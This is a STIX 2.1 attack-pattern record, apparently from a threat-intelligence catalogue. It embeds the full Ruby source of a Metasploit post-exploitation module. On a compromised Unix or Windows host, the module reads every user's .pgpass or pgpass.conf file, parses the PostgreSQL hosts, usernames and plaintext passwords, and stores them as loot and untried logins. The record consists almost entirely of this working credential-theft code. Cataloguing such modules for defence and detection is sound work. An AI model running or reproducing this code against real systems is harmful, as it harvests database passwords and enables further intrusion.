{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4635f6d4-88d0-43cd-bd83-f8808c40991e",
    "created": "2024-08-14T16:33:19.174812Z",
    "modified": "2024-08-14T16:33:19.174816Z",
    "name": "Multi Gather pgpass Credentials",
    "description": " This module will collect the contents of all users' .pgpass or pgpass.conf file and parse them for credentials.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/pgpass_creds.rb",
            "external_id": "pgpass_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather pgpass Credentials',\n        'Description' => %q{\n          This module will collect the contents of all users' .pgpass or pgpass.conf\n          file and parse them for credentials.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Zach Grace <zgrace[at]403labs.com>'],\n        'Platform' => %w[linux bsd unix osx win],\n        'SessionTypes' => %w[meterpreter shell]\n      )\n    )\n  end\n\n  def run\n    print_status('Finding pgpass creds')\n\n    files = []\n    case session.platform\n    when 'unix', 'linux', 'bsd', 'osx'\n      files = enum_user_directories.map { |d| d + '/.pgpass' }.select { |f| file?(f) }\n    when 'windows'\n      if session.type != 'meterpreter'\n        print_error('Only meterpreter sessions are supported on windows hosts')\n        return\n      end\n\n      grab_user_profiles.select do |user|\n        f = \"#{user['AppData']}\\\\postgresql\\\\pgpass.conf\"\n        if user['AppData'] && file?(f)\n          files << f\n        end\n      end\n    else\n      print_error(\"Unsupported platform #{session.platform}\")\n      return\n    end\n\n    if files.nil? || files.empty?\n      print_error('No users found with a .pgpass or pgpass.conf file')\n      return\n    end\n\n    files.each do |f|\n      # Store the loot\n      print_good(\"Downloading #{f}\")\n      pgpass_path = store_loot('postgres.pgpass', 'text/plain', session, read_file(f), f.to_s, \"pgpass #{f} file\")\n      print_good \"Postgres credentials file saved to #{pgpass_path}\"\n      # Store the creds\n      parse_creds(f)\n    end\n  end\n\n  # Store the creds to\n  def parse_creds(f)\n    cred_table = Rex::Text::Table.new(\n      'Header' => 'Postgres Data',\n      'Indent' => 1,\n      'Columns' => ['Host', 'Port', 'DB', 'User', 'Password']\n    )\n\n    read_file(f).each_line do |entry|\n      # skip comments\n      next if entry.lstrip[0, 1] == '#'\n\n      ip, port, db, user, pass = entry.chomp.split(/:/, 5)\n\n      # Fix for some weirdness that happens with backslashes\n      p = ''\n      bs = false\n      pass.split(//).each do |c|\n        if c == '\\\\'\n          if bs == false\n            bs = true\n            p << c\n          else\n            # second backslash ignore\n            bs = false\n          end\n        elsif c == ':' && bs == true\n          p = \"#{p[0, p.length - 1]}:\"\n        else\n          p << c\n        end\n      end\n\n      pass = p\n\n      # Display the original before we try to report it, so the user\n      # sees whatever was actually in the file in case it's weird\n      cred_table << [ip, port, db, user, pass]\n\n      if ip == '*' || ip == 'localhost'\n        ip = session.session_host\n      else\n        ip = Rex::Socket.getaddress(ip)\n      end\n\n      # Use the default postgres port if the file had a wildcard\n      port = 5432 if port == '*'\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: user,\n        private_data: pass,\n        private_type: :password,\n        realm_value: db,\n        realm_key: Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,\n        workspace_id: myworkspace_id\n      }\n\n      credential_core = create_credential(credential_data)\n\n      login_data = {\n        address: ip,\n        port: port,\n        protocol: 'tcp',\n        service_name: 'postgres',\n        core: credential_core,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED,\n        workspace_id: myworkspace_id\n      }\n      create_credential_login(login_data)\n    end\n\n    if !cred_table.rows.empty?\n      print_line\n      print_line(cred_table.to_s)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux bsd unix osx win]"
    ]
}